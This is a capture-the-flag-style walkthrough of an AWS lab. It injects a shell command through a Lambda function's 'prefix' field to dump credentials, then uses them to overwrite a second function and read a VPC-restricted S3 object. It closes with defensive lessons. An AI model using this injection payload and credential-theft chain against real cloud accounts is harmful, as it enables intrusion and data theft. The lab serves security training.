# Lambda - Data Exfiltration

## Mission brief
The Uruks of Mordor have hired you to get access to a CryptoWallet in the AWS Account belonging to a rival gang of Uruk-hai. The gang has obtained some AWS read-only AWS credentials to the target account through means you don't want to ask about. Unfortunately, the CryptoWallet is in an S3 Bucket protected by a VPC Endpoint policy. You cannot access it from anywhere except the VPC.
For this challenge, the read-only credentials are the same ones provided by the TryHackMe environment, so continue to use them. You will want to leverage your AttackBox for this exercise. 

## Reconnaissance of the Buckets in the Environment
- List the bucket
```bash
aws s3 ls
aws s3 ls s3://$BUCKET_NAME
```
- Check the bucket policy
```bash
aws s3api get-bucket-policy --bucket $BUCKET_NAME --query Policy --output text | jq .
```
![image](https://github.com/user-attachments/assets/9a7ce574-404c-45e4-923a-7abb78505ba5)
- From the outpout, we see that there is an explicit deny on all object operations from everywhere except a VPC.

- Explore the network topology
```bash
aws ec2 describe-vpc-endpoints
aws ec2 describe-vpcs
```

- This allows us to identify which vpc is attached to the bucket we target.

## Reconnaissance of the Lambda in the Environment
- List the Lambda functions
```bash
aws lambda list-functions
```
- From the Attacking Machine, run the following script to get the policies attached to the lambda functions
```bash
FUNCTIONS="list-images download-images"

for f in $FUNCTIONS ; do
    ROLE=`aws lambda get-function --function-name $f --query Configuration.Role --output text | awk -F\/ '{print $NF}'`
    echo "$f has $ROLE with these managed policies:"
    aws iam list-attached-role-policies --role-name $ROLE
    for p in `aws iam list-role-policies  --role-name $ROLE --query PolicyNames --output text` ; do
        echo "$ROLE for $f has inline policy $p:"
        aws iam get-role-policy --role-name $ROLE --policy-name $p
    done
done
```
The function list-images has the AWSLambda_FullAccess managed policy. This means that it can change any other function! The download-images function is already in the VPC, and it has the AmazonS3FullAccess managed policy, which would allow that function to view all of S3!

## Download and analyze the Lambda function
- We use `list-images` and `donwload-images` functions with `aws lambda get-function` to download the functions
```bash
FUNCTIONS="list-images download-images"
for f in $FUNCTIONS ; do
    URL=`aws lambda get-function --function-name $f --query Code.Location --output text`
    curl -s $URL -o $f.zip
    mkdir $f
    unzip $f.zip -d $f
done
# The above commands will loop the two functions and call get-function extracting the pre-signed URL for the function (Code.Location). It will then run curl on that pre-signed URL to download the code zip file, and extracts it  into a folder named after the function with the unzip command.
```

#### Attacking list-images function
```python
def lambda_handler(event, context):

  command = f"aws s3 ls s3://{os.environ['IMAGE_BUCKET']}/{event['prefix']}"
  files = os.popen(command).read()
  return(files)
```
- When passed th following JSON, this function will return a list of objects in the IMAGE_BUCKET, then run whatever else we add to the end of the command.

### Attacking download-images function
- Modify the `index.py` from the download-images. Change
```python
Bcuket=os.environ['IMAGE_BUCKET']
```
to

```python
Bucket='mauhr-coins-xxxx'
```
- Zip the modified `index.py`
```bash
zip -r ../compromised.zip index.py
```

## Exfiltrate Credentials
- Create the `payload.json`
```json
{
  "prefix":" ; env "
}
# This will tell the function to run the env command 
```

- Invoke the function
```bash
aws lambda invoke --function-name list-images --payload fileb://payload.json output.json
cat output.json | jq -r | grep AWS
```

- Open a new Terminal window and authenticate with the discovered credentials
```bash
export AWS_SESSION_TOKEN=$VALUE1
export AWS_SECRET_ACCESS_KEY=$VALUE2
export AWS_ACCESS_KEY_ID=$VALUE3
```

- Validate we're using the Lmabda function's credentials:
```bash
aws sts get-caller-identity
```

## Compormise VPC-enabled Function
- Now that we're using the Lambda function credentials, we can update the `download-images` function with the previously created zip.
```bash
aws lambda update-function-code --region us-east-1 --function-name download-images --zip-file fileb://compromised.zip
```
- Create a new file `payload2.json`
```bash
{"object_key": "password.txt"}
```
- Invoke the compromised function to read the target file:
```bash
aws lambda invoke --function-name download-images --payload fileb://payload2.json output2.json
```

## What did the Orcs of Mordor do wrong?
**1. Overly permissive roles**
- `download-images` function didn't need `AmazonS3FullAccess`. If the function is only configured to access the right bucket, attackers wouldn't have got access to tthe `mauhur-cois-xxx` bucket.
- `list-images` function didn't need `AWSLAmbda_FullAccess`

**2. Unsanitized inputs**
- `list-images` function didn't validate `event['prefix']` before passing it to the shell.

**3. Lambda in a VPC**
- There was no good reason to place the `download-images` function in the `Mauhur's VPC - Do Not Use`. Granting them unneeded access to the private corporate network allows an attacker to latterally move from the cloud to the network.

**4. Leaking Read-Only credentials**
- Not sure if the user should be granted Read-Only access but this permission should be granted with care as it may lead to disclosing sensitive information.

**5. Account Separation**
- The Orcs used one account for everything. AWS recommends creating new AWS accounts for each differnet application and business function.
